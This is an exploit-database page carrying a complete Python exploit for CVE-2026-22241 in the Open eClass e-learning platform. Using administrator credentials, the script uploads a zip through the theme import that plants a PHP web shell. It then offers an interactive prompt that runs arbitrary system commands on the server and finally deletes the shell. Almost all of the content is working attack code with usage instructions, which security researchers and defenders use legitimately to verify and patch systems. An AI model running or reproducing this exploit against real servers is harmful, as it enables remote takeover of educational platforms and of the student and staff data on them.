---
title: GUnet OpenEclass E-learning platform <  4.2 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2026050012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-19
fetch_date: 2026-05-20T05:58:33.187802
---

# GUnet OpenEclass E-learning platform <  4.2 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **GUnet OpenEclass E-learning platform < 4.2 Remote Code Execution (RCE)** **2026.05.19**  Credit:  **[Ashif Iqubal](https://cxsecurity.com/author/Ashif%2BIqubal/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-22241](https://cxsecurity.com/cveshow/CVE-2026-22241/ "Click to see CVE-2026-22241")**  CWE: **N/A** | |

# Exploit Title: GUnet OpenEclass E-learning platform < 4.2 - Remote Code Execution (RCE)
# Date: 2026-01-08
# Exploit Author: Ashif Iqubal
# Vendor Homepage: https://www.openeclass.org/
# Software Link: https://download.openeclass.org/files/4.1/
# Version: < 4.2
# Tested on: Debian Ubuntu (Apache/2.4.58, PHP 8.3.6, MySQL 8.0.40-0ubuntu0.24.04.1)
# CVE: CVE-2026-22241
import os
import sys
import zipfile
import requests
import argparse
from bs4 import BeautifulSoup
from argparse import RawTextHelpFormatter
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RESET = '\033[0m'
ORANGE = '\033[38;5;208m'
MALICIOUS\_PAYLOAD = """\
<?php
if(isset($\_REQUEST['cmd'])){
$cmd = ($\_REQUEST['cmd']);
system($cmd);
die;
}
?>
"""
def banner():
print(f'''{YELLOW}
┏━╸╻ ╻┏━╸ ┏━┓┏━┓┏━┓┏━┓ ┏━┓┏━┓┏━┓╻ ╻╺┓
┃ ┃┏┛┣╸ ╺━╸┏━┛┃┃┃┏━┛┣━┓╺━╸┏━┛┏━┛┏━┛┗━┫ ┃
┗━╸┗┛ ┗━╸ ┗━╸┗━┛┗━╸┗━┛ ┗━╸┗━╸┗━╸ ╹╺┻╸
{RED} Author: @Ashif1337 {RESET}''')
def clean\_server(openeclass,filename):
print(f"{ORANGE}[+] Removing Backd00r...{RESET}")
# Remove the uploaded files
requests.get(f"{openeclass}/courses/theme\_data/{filename}?cmd=rm%20{filename}")
print(f"{GREEN}[+] Server cleaned successfully!{RESET}")
def execute\_command(openeclass, filename):
while True:
# Prompt for user input with "eclass"
cmd = input(f"{RED}[{YELLOW}eClass{RED}]~> {RESET}")
# Check if the command is 'quit', then break the loop
if cmd.lower() == "quit":
clean\_server(openeclass,filename)
print(f"{ORANGE}[+] Exiting...{RESET}")
sys.exit()
# Construct the URL with the user-provided command
url = f"{openeclass}/courses/theme\_data/{filename}?cmd={cmd}"
# Execute the GET request
try:
response = requests.get(url)
# Check if the request was successful
if response.status\_code == 200:
# Print the response text
print(f"{GREEN}{response.text}{RESET}")
except requests.exceptions.RequestException as e:
# Print any error that occurs during the request
print(f"{RED}An error occurred: {e}{RESET}")
def upload\_web\_shell(openeclass, username, password):
login\_url = f'{openeclass}/?login\_page=1'
login\_page\_url = f'{openeclass}/main/login\_form.php?next=%2Fmain%2Fportfolio.php'
# Login credentials
payload = {
'next': '/main/portfolio.php',
'uname': f'{username}',
'pass': f'{password}',
'submit': 'Enter'
}
headers = {
'Referer': login\_page\_url,
}
# Use a session to ensure cookies are handled correctly
with requests.Session() as session:
# (Optional) Initially visit the login page if needed to get a fresh session cookie or any other required tokens
session.get(login\_page\_url)
# Post the login credentials
response = session.post(login\_url, headers=headers, data=payload)
# Create a zip file containing the malicious payload
zip\_file\_path = 'poc.zip'
with zipfile.ZipFile(zip\_file\_path, 'w') as zipf:
zipf.writestr('evil.php', MALICIOUS\_PAYLOAD.encode())
# Get token
token\_url = session.get(f'{openeclass}/modules/admin/theme\_options.php',allow\_redirects=False)
if token\_url.status\_code != 200 :
print(f"{RED}[X] Invalid Administrator Password!{RESET}")
print(f"{RED}[X] Exiting...{RESET}")
return False
upload\_token = BeautifulSoup(token\_url.text, 'html.parser').select\_one('input[name="token"]')['value']
# Upload the zip file
url = f'{openeclass}/modules/admin/theme\_options.php'
files = {
'themeFile': ('poc.zip', open(zip\_file\_path, 'rb'), 'application/zip'),
'import': (None, ''),
'token': (None, upload\_token)
}
response = session.post(url, files=files)
# Clean up the poc zip file
os.remove(zip\_file\_path)
# Check if the upload was successful
if response.status\_code == 200:
print(f"{GREEN}[+] Payload uploaded successfully!{RESET}")
print(f"{GREEN}[+] Type 'quit' to exit web shell!{RESET}")
return True
else:
print(f"{RED}[X] Failed to upload payload.{RESET}")
print(f"{RED}[X] Exiting...{RESET}")
return False
def main():
parser = argparse.ArgumentParser(description="Open eClass Unrestricted File Upload RCE Exploit [ CVE-2026-22241 ]\nExample: CVE-2026-22241.py -t http://127.0.0.1/openeclass -u admin -p adminpassword",formatter\_class=RawTextHelpFormatter)
parser.add\_argument('-t', '--eclassUrl', required=True, help="Target URL of the Open eClass.")
parser.add\_argument('-u', '--username', required=True, help="Admin Username for login.")
parser.add\_argument('-p', '--password', required=True, help="Admin Password for login.")
args = parser.parse\_args()
banner()
# Running the main login and execute command function
if upload\_web\_shell(args.eclassUrl, args.username, args.password):
execute\_command(args.eclassUrl, 'evil.php')
if \_\_name\_\_ == "\_\_main\_\_":
main()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top